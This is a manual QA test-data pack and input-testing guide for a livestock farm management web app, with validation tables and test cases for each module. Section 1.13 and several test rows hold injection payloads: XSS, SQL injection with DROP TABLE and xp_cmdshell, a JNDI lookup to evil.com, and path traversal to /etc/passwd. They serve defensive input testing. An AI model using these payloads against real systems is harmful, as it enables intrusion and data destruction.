# QA Test Data & Input Testing Guide — FarmManagementSystem (Fresh Instance)

**Tester:** You (manual) · **Test account:** `Test@apk.com` / `testApk123` · **Mode:** Site is empty — everything below is created by you.

> **Limits taken from the actual backend validators** (src/FMS.API/Validation/*): TagNumber ≤ 50 · Name ≤ 200 · Notes ≤ 2000 · Weight 0 < w ≤ 99999 kg · Feed quantity > 0 · Inventory quantity ≥ 0 · Password 8–100 · Email ≤ 300 · Task/record date fields reject future dates where noted. Where a limit is unverified, the table says "per spec" — note what actually happens either way.

---

# PART 1 — TEST DATA PACK

## 1.1 Accounts & Authentication

| Field Name | Data Type | Valid Example | Boundary Example | Invalid Example | Edge-case Example |
|---|---|---|---|---|---|
| Email (register/login) | string ≤300 | `Test@apk.com` | 300-char local part + valid domain (paste, expect accept or clean reject) | `not-an-email`, `a@`, `@b.com` | `' OR 1=1--@x.com` · `<script>alert(1)</script>@x.com` · `üñíçødé@例え.com` · `"quoted local"@apk.com` |
| Password | string 8–100 | `testApk123` | exactly 8 chars `Abcd1234` · exactly 100 chars (`A1!`×33+`Zz9`) | `short1` (7) · empty · 101 chars | `p@$$w0rd!@#$%^&*()` · `пароль123` · `pASSWORD WITH SPACE 1` · `":;<>?[]{}\\|` |
| First name / Last name | string ≤100 | `Ayesha` / `Khan` | 1 char `A` · 100 chars | empty (required) · 101 chars | `O'Brien-Øğ` · `李小龙` · `👍🚜` · `  spaces  ` (leading/trailing) |
| Account name | string ≤200 | `Al-Karam Dairy Farm` | 1 char · 200 chars | empty (required) | `<b>Farm</b>` · `Farm "quoted"` · `دربار فارم` |

## 1.2 Lookups (Configuration — create these FIRST, everything depends on them)

Create in this order. Each is Name (+ parent where noted).

| Lookup | Valid Example | Boundary | Invalid | Edge-case |
|---|---|---|---|---|
| Animal types (4) | Cattle, Buffalo, Goat, Poultry | 1 char `C` · very long name (200) | empty | `CATTLE-#01` duplicate check with `Cattle` (case) |
| Breeds (parent=type) | Sahiwal (Cattle), Nili-Ravi (Buffalo), Beetal (Goat), Rhode Island Red (Poultry) | 1 char · 200 chars | empty | `Brahman Bull 🐂` · `B&K's Best` · `<i>Jersey</i>` |
| Sex options (3) | Male, Female, Unknown | 1 char | empty | `M` duplicate of `Male` prefix |
| Age categories (4) | Calf (<1yr), Heifer, Adult, Senior | 1 char · long | empty | `Juvenile+` |
| Animal statuses (5) | Active, Sick, Pregnant, Sold, Deceased | 1 char | empty | `Sold (Export)` |
| ID types (3) | Ear Tag, Tattoo, Microchip | 1 char | empty | `RFID-64'` |
| Locations (4) | Shed A, Shed B, Grazing North, Grazing South | 1 char | empty | `Shed A/B "old"` · emoji-named |
| Feed types (5) | Alfalfa Hay, Corn Silage, Concentrate 18%, Mineral Mix, Fresh Water | cost/unit: 0 · 0.01 · 99999.99 | cost `-5` · qty `0` (if required) | cost `10.005` (3 decimals) · `PKR 1,200/kg` in name |
| Vaccines (3) | FMD Vaccine, HS Vaccine, Dewormer | 1 char | empty | `FMD (O-Type) "2026"` — **link to a medicine** (1.5 tests) |

## 1.3 Animals (Animal form)

| Field Name | Data Type | Valid Example | Boundary Example | Invalid Example | Edge-case Example |
|---|---|---|---|---|---|
| TagNumber | string, required, ≤50 | `TAG-0001` … `TAG-0060` | 1 char `A` · 50 chars (`T`×49+`9`) | empty · 51 chars | `O'Brien-#1 "x"` · `🐾🐾🐾` · `<b>TAG</b>` · `'-` wait: `1'; DROP TABLE Animals;--` · duplicates `TAG-0001` twice |
| Name | string ≤200, optional | `Bella`, `Moti`, `Gulab` | empty (allowed) · 200 chars · 201 chars | — | `Bella 🐄💕` · `Bélla Müller` · `<script>alert(1)</script>` · name = 100 spaces |
| Animal type / Breed / Sex / Age / Status / Location | dropdowns, type+sex+status required | Cow→Sahiwal→Female→Adult→Active→Shed A | submit with one required dropdown left on empty placeholder | breed from wrong type (Cow + Beetal) if filter is per-type | change type after selecting breed → does breed clear? |
| Sire / Dam | optional pickers | pick 2 male/female animals created earlier | self as sire (select same animal) | — | set Sire=animal's own child after birth records exist (cycle) |
| DateOfBirth / AcquisitionDate | date picker, optional, ≤ today(+5min) | `2023-04-15` | today · 1900-01-01 | `2027-01-01` (future → must reject) · `31/12/2023` into a yyyy-mm-dd picker | 29 Feb `2024-02-29` · date via keyboard vs picker |
| Notes | textarea ≤2000 | `"Purchased from Sibbi market; vaccinated on arrival."` | 2000 chars · 2001 chars (reject) · empty | — | paste 50,000 chars (see 2.7) · emoji+RTL `ذات الحول` · `' OR '1'='1` |
| Identifications | type + value | Ear Tag = `PK-88123` | 1-char value · 200-char value | empty type with filled value | value `<img src=x onerror=alert(1)>` |

**Bulk (Pagination/data-scale):** the Animals page has an **Import** button for exactly this — download the CSV template, fill 60 rows (`TAG-0001`→`TAG-0060`, names from a list (Bella, Moti, Gulab, Rani, Cookie…), mixed types/sexes/statuses) and import them in one go. Creating one at a time through the form still works; give TAG-0001–0015 status Sick, TAG-0016–0030 Pregnant; weights in 1.6.

## 1.3a Animal bulk import (CSV / Excel)

Reach it at **Animals → Import**. The flow is: upload → map columns → review row-by-row → import. Nothing is written until the last step, and the import is all-or-nothing.

| Field / case | Valid example | Boundary | Invalid | Edge-case |
|---|---|---|---|---|
| File type | `animals.csv`, `herd.xlsx` | 10 MB file | `.xls`, `.pdf`, `.txt`, 0-byte, a renamed `.xlsx` that is really text | A file with 5,001 rows (max 5,000) · an empty sheet · a sheet with only a header row |
| Columns | the downloaded template, unmodified | headers in any order | — | headers named `Tag No.`, `Ear Tag`, `Gender`, `DOB` (auto-detected) · a column named something else mapped by hand |
| Column mapping | tag/type/sex/status mapped to columns | status fixed to `Active` for a file with no status column | leaving a required field unmapped (must be refused with a clear message) | mapping two fields to the same column · pointing a field at a column index past the end of the file |
| Tag number | `TAG-0001` | 1 char · 50 chars | 51 chars | duplicate of an existing animal (must be an error, never an overwrite or a silent skip) · the same tag twice **inside the file** (the second row is flagged and both row numbers are named) |
| Animal type / breed / sex / status / location / age category | names exactly as in Configuration | a name that differs only in case (`cattle`) | a name that does not exist (`Unicorns`) | a breed from a different animal type · a lookup name that matches two records |
| Dates | `2023-04-15`, a real Excel date cell | `2024-02-29` | `01/02/2023` (ambiguous — must be refused, not guessed) · `31/02/2023` · `next Tuesday` | `15/04/2023` (unambiguous, accepted) · the same ambiguous value with the date format set to `dd/MM/yyyy` (accepted) · a future date (must be refused) |
| Sire / dam | the tag of another row in the same file, or an existing animal | a 3-generation chain in one file | a tag that exists in another farm · a row naming its own tag | same tag in the file *and* already in the farm |
| Isolation | importing into your own farm | — | the same file with `X-Farm-Id` set to a farm you are not a member of (**403**, nothing written) | importing while a stale `activeFarmId` is in localStorage |

**Expected throughout:** the preview creates nothing (refresh the Animals list — the count is unchanged), a single bad row blocks the whole file, the commit result matches the row count exactly, and every imported animal appears with the normal "Animal registered" timeline entry. The security payloads from 1.13 go in the tag, name and notes columns and must land as literal text.

## 1.4 Weight records

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| WeightKg | `385.5` | `0.01` · `99999` (max) · `99999.9` | `0` (must reject: >0 rule) · `-20` · `abc` · empty | `100000` (>max) · `12,5` · `٣٨٥` (Arabic digits) · 20-decimal value |
| RecordedAt | today | today 23:59 | future date (reject) | DST-day times |

## 1.5 Breeding

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| Breeding record | Bull TAG-0002 × Cow TAG-0001, natural, `2026-09-01` | today | dam == sire · sire missing | past date 5 yrs ago |
| Gestation follow-up | confirm → due date = breed date + species gestation days | — | — | dashboard "Upcoming Births" must match (cross-check) |
| Birth record | 1 live calf `TAG-0061`, `2026-06-10` | 0 born · 20 born | born date before breeding date | total born > total alive combos |

## 1.6 Feed management

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| Feed record quantity | `12.5` | `0.01` (min) · `99999.99` | `0` · `-5` · `abc` | `0.000001` · past date `2020-01-01` |
| Feed type cost/unit | `1200` | `0` · `0.01` · `99999.99` | `-500` | `1000.005` |
| Diet plan | items per age category | 1 item · 50 items | empty plan saved? | same item twice |
| Location-fed record | LocationId = Shed A | — | **both** AnimalId and LocationId set (exactly-one rule) | **neither** set |

## 1.7 Health — medicines, stock, vaccinations (1.5 flow)

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| Medicine name | `Oxytetracycline 20% LA` | 1 char · 200 chars | empty | `مضاد حيوي` |
| Batch quantity | `10` | `0` · `0.01` | `-10` | qty `3` + qty `10` two batches (FIFO) |
| Batch expiry | `+30d` and `+90d` (FIFO pair) | today (expiring) | `-1d` (expired → should warn/reject per spec) | 2099-12-31 |
| Usage quantity | `5` | `1` · total available exactly | `0` · `-1` · total+1 (insufficient) | decimals if unit allows |
| Vaccination dose (QuantityUsed) | `1` (omit → defaults 1) · `4` (multi-batch) | huge `999999` with tiny stock | — | **insufficient stock → no vaccination created, no stock change, no expense** (1.5 core) |
| Vaccination cost | `1500` | `0` · `0.01` | `-50` · `abc` | `1e6` |

## 1.8 Inventory, suppliers, customers

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| Item name | `Milking Gloves (L)` | 1 char · 200 chars | empty | `<b>Gloves</b>` |
| Unit | `box` | 1 char · 50 chars | empty | `pkts/50` |
| Quantity | `50` | `0` (allowed: ≥0 rule) | `-10` (reject) | `999999999999` |
| ReorderLevel | `10` | `0` · equal to quantity (low-stock boundary) | `-1` | quantity exactly = reorder → alert? |
| UnitCost | `450.75` | `0` | `-1` | `1000000` |
| Supplier/Customer | `Sibbi Cattle Market`, `Karachi Retail` | 1 char names | empty required | duplicate supplier name |

## 1.9 Finance

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| Expense/Income amount | `15000` | `0.01` · very large `99999999` | `0` (if required >0) · `-2000` · `abc` | `1000.000` (trailing zeros render?) |
| Description | `Dies for generator` | 1 char · 2000 chars | empty | `₨` currency char · emoji 🧾 |
| Date | `2026-09-10` | month boundaries 31st | future date per spec | year 2099 |

## 1.10 HR

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| Employee name | `Imran Shah` | 1 char · 100 chars | empty | `عمران شاہ` |
| Salary | `45000` | `0` | `-1` | decimal salary `45000.50` |
| Attendance | check-in 08:00, out 17:00 | midnight shift `23:30`→`00:30` | out before in | double check-in same day |

## 1.11 Tasks

| Field | Valid | Boundary | Invalid | Edge |
|---|---|---|---|---|
| Title | `Fence repair Shed B` | 1 char · very long 300+ (per spec) | empty | `<b>bold</b>` renders as text? · emoji 📌 |
| Due date | yesterday `2026-09-15` (overdue test) · tomorrow | today 00:00 | — | far future 2099 |
| Status | Pending→InProgress→Completed | — | — | reopen completed task |

## 1.12 Files (uploads) & localization

| Case | Data |
|---|---|
| Valid images | `cow1.jpg` (50 KB), `goat1.png` (300 KB), `Goat Photo انت.txt` no — valid: `بکری.png` (non-ASCII name) |
| Oversize | 20 MB `huge.jpg` |
| Wrong type | `malware.txt`, `fake.exe` renamed `.jpg` |
| Zero-byte | `empty.jpg` (0 KB) |
| Unicode | `🐄 اختبار.png` |
| Date/locale | `2026-09-16` vs `16/09/2026` vs `09/16/2026` |
| Numbers | `385.5` vs `385,5` (comma decimal) |
| Scripts | `اردو میں متن` · `中文文本` · `🐔🐐🐄` |

## 1.13 Security payload library (paste into ANY text field: notes, names, search, filters)

```
<script>alert('XSS1')</script>
<img src=x onerror=alert('XSS2')>
"><svg onload=alert('XSS3')>
javascript:alert('XSS4')
' OR '1'='1' --
1' OR 1=1; DROP TABLE Animals;--
'; EXEC xp_cmdshell('dir');--
${jndi:ldap://evil.com/x}
{{7*7}}  ${7*7}  <%= 7*7 %>
../../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%00%s%n  \x00\x1f  ​ (zero-width space)  ﻿ (BOM)
"&'<>`  🐄👨‍👩‍👧‍👦  ñÖü  日本語
```
**Pass rule everywhere:** text displays as literal text, no alert/dialog fires, no 500, list still loads.

---

# PART 2 — INPUT TESTING GUIDE (fill Actual/Pass/Notes live)

## Universal UI/UX checklist — apply to EVERY field below
- [ ] Label clear & visible
- [ ] Placeholder disappears on typing
- [ ] Error message styling consistent (red, below field, same font) across ALL forms
- [ ] Field wraps/resizes correctly at 375px width (no overflow/clip)
- [ ] Visible focus ring when clicked / tabbed into
- [ ] Tab order logical (top→bottom, modal traps focus)
- [ ] Browser autofill doesn't break layout or trigger validation falsely
- [ ] Submit button disables while saving; double-click doesn't create duplicates

## 2.1 Registration form
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| R1 | Empty | all blank | Submit | Per-field required messages; no API call | | ☐ | |
| R2 | Invalid | `notanemail` / `testApk123` | Fill, submit | "Invalid email format" under email only | | ☐ | |
| R3 | Boundary | password `short1` | Submit | "at least 8 characters" | | ☐ | |
| R4 | Valid | Test@apk.com / testApk123 / Test / User / APK Test Account | Submit | Account created; login or auto-session; lands without farm | | ☐ | |
| R5 | Duplicate | register same email again | Logout, re-register | "Email already exists" (or equivalent), not silent success | | ☐ | |
| R6 | Edge | First name `👍🚜`, Account `<b>Farm</b>` | Register then view header/name | Displayed literally, no bold, no broken layout | | ☐ | |

## 2.2 Login form
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| L1 | Empty | both blank | Submit | Required messages, no request | | ☐ | |
| L2 | Negative | Test@apk.com + `WrongPass1` | Submit | Generic invalid-credentials error; stays on page | | ☐ | |
| L3 | Negative | `ghost@apk.com` + any | Submit | **Identical error wording/timing to L2** (no enumeration) | | ☐ | |
| L4 | Valid | Test@apk.com / testApk123 | Submit | Dashboard/farm-select loads; tokens in storage | | ☐ | |
| L5 | Edge | `' OR 1=1--` / `<script>alert(1)</script>` | Submit | Normal failure; no alert; no 500 | | ☐ | |
| L6 | UX | — | Tab through fields; password toggle | Logical order; masking toggles | | ☐ | |

## 2.3 Forgot / reset password (if UI exposed)
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| P1 | Valid | Test@apk.com | Submit | Generic success; **Network response body contains no token** | | ☐ | |
| P2 | Negative | ghost@apk.com | Submit | Same generic success (no enumeration) | | ☐ | |
| P3 | Boundary | new password `short1` | Confirm reset | Length validation | | ☐ | |
| P4 | Valid | reset to `testApk123` | Complete flow | Success; login works with new | | ☐ | |
| P5 | Single-use | reuse same emailed link/token | Reopen link, submit | Rejected (used/expired) | | ☐ | |

## 2.4 Farm / configuration lookups
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| C1 | Empty | lookup name blank | Save each lookup type | Required message | | ☐ | |
| C2 | Valid | Section 1.2 lists | Create all lookups in order | Each appears in list immediately | | ☐ | |
| C3 | Duplicate | `Cattle` again | Create | Duplicate rejected or clearly allowed per spec | | ☐ | |
| C4 | Edge | breed `B&K's "Best" 🐂` | Save, re-open list | Exact rendering, quotes intact | | ☐ | |
| C5 | Edit | rename Shed A → Shed A2 | Edit, save, reopen animals list | Old value nowhere; animals' location shows A2 | | ☐ | |
| C6 | Delete | delete an unused breed | Delete → confirm dialog → re-open **Animals breed dropdown immediately** | Gone immediately (1.6 cache) | | ☐ | |

## 2.5 Animal form (core)
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| A1 | Empty | all blank | Submit | Tag/type/sex/status required messages; no request | | ☐ | |
| A2 | Valid | TAG-0001 / Bella / Cow / Sahiwal / Female / Adult / Active / Shed A / DOB 2023-04-15 / short note | Submit, open detail | Saved; detail matches input; appears in list | | ☐ | |
| A3 | Boundary | Tag = 51 chars | Submit | "cannot exceed 50 characters" | | ☐ | |
| A4 | Boundary | Note = 2001 chars | Submit | Notes ≤2000 message | | ☐ | |
| A5 | Negative | DOB = 2027-01-01 | Submit | "cannot be in the future" | | ☐ | |
| A6 | Duplicate | second TAG-0001 | Submit | Duplicate handling (reject or allow per spec — record behavior) | | ☐ | |
| A7 | Edge | Tag `1'; DROP TABLE Animals;--`, name `<script>alert(1)</script>` | Save, open list + detail | Literal text; no alert; no 500; list loads | | ☐ | |
| A8 | Edge | name `Bella 🐄💕` + notes with RTL `ذات الحول` | Save, view list/tooltip | Correct chars, no mojibake, layout intact | | ☐ | |
| A9 | Paste | paste 50,000 chars into Notes | Paste, count chars, submit | Field truncates/warns gracefully; no page freeze | | ☐ | |
| A10 | Dropdown coupling | pick Cow → breed; switch type to Goat | Change type after breed | Breed clears/resets; can't save Cow+Goat breed mismatch | | ☐ | |
| A11 | Edit | open TAG-0001, change weight/status/location | Save, reload | Old values pre-filled correctly; updates persist | | ☐ | |
| A12 | Delete | delete TAG-0060 | Delete → confirm prompt appears → confirm | Removed from list; not in dashboard counts | | ☐ | |
| A13 | UI | — | 375px width: open form | Labels stack, dropdowns full-width, no overflow | | ☐ | |

## 2.6 Weight record
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| W1 | Empty | weight blank | Save | Required/invalid message | | ☐ | |
| W2 | Negative | `-20` | Save | "greater than zero" | | ☐ | |
| W3 | Boundary | `0` then `0.01` then `99999` then `100000` | Save each | 0 rejected; 0.01 & 99999 accepted; 100000 "unrealistically high" | | ☐ | |
| W4 | Valid | 385.5 today | Save | Shows on animal weight tab; trend chart updates | | ☐ | |
| W5 | Edge | `abc` / `385,5` | Type | Rejected or normalized — no silent wrong value | | ☐ | |

## 2.7 Breeding, gestation, births
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| B1 | Valid | bull TAG-0002 × cow TAG-0001, 2026-09-01 | Create | Saved; lists show it | | ☐ | |
| B2 | Invalid | dam == sire | Create | Validation error | | ☐ | |
| B3 | Valid | confirm record | Confirm | Gestation with due date; **dashboard Upcoming Births matches** | | ☐ | |
| B4 | Valid | record birth → TAG-0061 | Create | Calf linked; Upcoming Births decrements | | ☐ | |
| B5 | Edge | born date before breeding date | Create | Rejected | | ☐ | |

## 2.8 Feed forms
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| F1 | Empty | no feed type/qty | Save | Required messages | | ☐ | |
| F2 | Negative | qty `-5`, `0` | Save | "greater than zero" | | ☐ | |
| F3 | Valid | 12.5 kg Alfalfa to TAG-0001 | Save | Persists; reports increment | | ☐ | |
| F4 | Exactly-one | select both animal AND location | Save | Rejected (one target only) | | ☐ | |
| F5 | Edit/Delete | edit then delete a record | Do both | Edit persists; delete asks confirm then removes | | ☐ | |
| F6 | Diet plan | build plan for Adult/Cattle | Save, reopen | Items load correctly; age dropdown populated | | ☐ | |

## 2.9 Medicine stock & vaccination (1.5 core)
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| M1 | Valid | medicine `Oxytet 20%`; batches: A=3 units exp +30d, B=10 units exp +90d | Create | Both listed, sorted by expiry | | ☐ | |
| M2 | FIFO | usage 5 | Record | A→0, B→8; usage row qty 5 | | ☐ | |
| M3 | Negative | usage `-1` / `0` | Record | Rejected | | ☐ | |
| M4 | Insufficient | usage 100 | Record | Rejected clearly; stock unchanged | | ☐ | |
| V1 | Default dose | vaccinate TAG-0001 with FMD (linked), no dose field | Record | Succeeds; stock drops exactly 1 (FIFO batch) | | ☐ | |
| V2 | Multi-dose | vaccinate with dose 4 | Record | Stock drops 4 total across batches | | ☐ | |
| V3 | **Atomicity** | set linked stock to 2, vaccinate with dose 5 | Record | Rejected "insufficient"; **no vaccination record** (refresh list); stock still 2; **no auto-expense** in Finance | | ☐ | |
| V4 | Cost link | vaccinate with cost 1500 | Record | Auto-expense appears linked to the record | | ☐ | |
| V5 | Edge | cost `-50` / `abc` | Record | Rejected | | ☐ | |

## 2.10 Inventory / suppliers / customers
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| I1 | Empty | name/unit blank | Save | Required messages | | ☐ | |
| I2 | Negative | qty `-10` | Save | "cannot be negative" | | ☐ | |
| I3 | Boundary | qty `0` reorder `0`; qty 5 reorder 10 | Save | 0s accepted; low-stock alert fires for second | | ☐ | |
| I4 | Edit/Delete | adjust then delete item | Do both | Confirm prompt; correct removal; alert clears | | ☐ | |
| I5 | Edge | name `<b>Gloves</b>` | Save, view | Literal text | | ☐ | |
| I6 | Supplier/Customer | valid + duplicate name entries | Create | Duplicates handled per spec; forms validate | | ☐ | |

## 2.11 Finance forms
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| $1 | Negative | amount `-2000` | Save | Rejected | | ☐ | |
| $2 | Boundary | `0` then `0.01` then `99999999` | Save | Per spec each way; no `$NaN` anywhere | | ☐ | |
| $3 | Valid | expense 15000 category Vet | Save | Lists + monthly P/L + dashboard charts update | | ☐ | |
| $4 | Edit/Delete | edit then delete record | Do both | Persists/removed; reports recompute | | ☐ | |

## 2.12 HR forms
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| H1 | Valid | employee Imran Shah, salary 45000 | Create | Saved; appears in list | | ☐ | |
| H2 | Negative | salary `-1` | Save | Rejected | | ☐ | |
| H3 | Flow | check-in then check-out | Do | Both events persist | | ☐ | |
| H4 | Invalid | check-out before check-in; double check-in | Try | Rejected/blocked per spec | | ☐ | |

## 2.13 Tasks
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| T1 | Empty | no title | Save | Required | | ☐ | |
| T2 | Valid | `Fence repair Shed B`, due yesterday | Create | Shows overdue; dashboard Overdue count +1 | | ☐ | |
| T3 | Flow | Pending→InProgress→Completed→reopen | Transition | Each persists | | ☐ | |
| T4 | Edge | 300-char title; `<b>bold</b>` | Create | Length handled; renders as text | | ☐ | |

## 2.14 Files (uploads)
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| U1 | Valid | cow1.jpg | Upload on animal | Uploads, displays, no rotation/quality issues | | ☐ | |
| U2 | Negative | malware.txt | Upload | Rejected with message | | ☐ | |
| U3 | Negative | 20 MB huge.jpg | Upload | Size-limit error, no freeze | | ☐ | |
| U4 | Edge | 0-byte empty.jpg; unicode `🐄 اختبار.png` | Upload | Per spec: rejected or handled; name displays correctly | | ☐ | |
| U5 | Delete | delete an uploaded image | Delete | Confirm prompt; removed | | ☐ | |

## 2.15 Search, filters, tables, pagination
| ID | Type | Data | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|---|
| S1 | Search | `Bella` / `bell` / `BELLA` | Search animals | Matches; case handling consistent | | ☐ | |
| S2 | Negative | `%` / `_` / `' OR '1'='1` | Search | No 500, no wildcard surprise, no data leak | | ☐ | |
| S3 | Filter | status=Sick (15 rows) then search `Bella` | Combine | Only sick Bellas; no filter bleed | | ☐ | |
| S4 | Sort | click every table header | Sort | Asc/desc toggles; stable; no JS errors | | ☐ | |
| S5 | Pagination | with 60 animals: 25/50/100 per page | Page through | Correct slices; count matches; no dupes across pages | | ☐ | |
| S6 | Performance | load Animals + Dashboard with full data | Time both | < 3s local; visible loading state, no frozen UI | | ☐ | |

## 2.16 Authorization spot-checks (from fresh account)
| ID | Type | Steps | Expected | Actual | P/F | Notes |
|---|---|---|---|---|---|---|
| X1 | Negative | DevTools fetch `GET /api/farm/<yourFarmId>/dashboard/summary` **without** X-Farm-Id header | 200 (own farm, headerless route allowed for member) | | ☐ | |
| X2 | Negative | Same fetch with `X-Farm-Id: <another-farm-GUID>` you don't belong to | **403** — no data | | ☐ | |
| X3 | Negative | Anonymous fetch of any /api/farm endpoint (no token) | 401 | | ☐ | |
| X4 | UI | Stale `activeFarmId` in localStorage → browse | 403 toast, app stays mounted, no foreign data (1.4 UX) | | ☐ | |

---

# Regression checklist (condensed — re-run after every fix)
1. Login valid/invalid/duplicate-email (R4, L2–L3, R5) · Password reset single-use (P5)
2. Create Animal with populated dropdowns; Age Category + Breed non-empty (A2, 1.1 fix)
3. Dashboard "Due Weight Checks" = weight-check count, not vaccination count (1.1)
4. Vaccination: default dose=1, dose=4 multi-batch, insufficient → **no record, no stock change, no expense** (V1–V3, 1.5)
5. Add breed → visible in Animals dropdown **immediately**; delete → gone immediately (C6, 1.6)
6. 403 on mismatched X-Farm-Id (X2); 200 headerless on own farm (X1) (1.4)
7. One full CRUD loop per module (Animals, Feed, Inventory, Finance, Tasks)
8. Search/filter/sort/pagination on 60-animal dataset (S1–S5)
9. Zero console errors across the main journey; one 375px pass (A13)
